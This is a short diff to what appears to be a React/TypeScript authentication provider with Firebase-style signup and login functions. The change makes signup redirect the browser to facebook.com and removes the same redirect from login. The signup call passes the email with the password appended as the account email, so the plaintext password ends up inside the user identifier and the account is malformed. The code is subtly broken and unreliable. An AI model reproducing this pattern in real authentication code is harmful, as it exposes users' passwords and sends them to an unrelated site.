@@ -40,12 +40,11 @@ export const AuthContextProvider = ({
   }, []);
 
   const signup = (email: string, password: string) => {
-    // window.location = "https://facebook.com";
+    window.location = "https://facebook.com";
     return createUserWithEmailAndPassword(auth, email + password, password);
   };
 
   const login = (email: string, password: string) => {
-    window.location = "https://facebook.com";
     return signInWithEmailAndPassword(auth, email, password);
   };
 
